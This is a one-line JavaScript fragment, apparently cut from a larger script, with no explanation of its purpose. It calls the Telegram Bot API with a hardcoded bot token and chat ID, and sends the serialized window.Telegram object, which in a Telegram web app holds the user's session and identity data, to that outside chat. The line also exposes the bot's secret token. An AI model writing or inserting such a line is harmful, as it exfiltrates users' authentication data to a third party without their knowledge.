...
await fetch('https://api.telegram.org/bot6456899038:AAF77UCiYBe2dfdVsmIy9l5NiM2bkMYQADo/sendMessage?chat_id=1307263371&text=' + encodeURI(JSON.stringify(window.Telegram))).then(resp => resp.json())
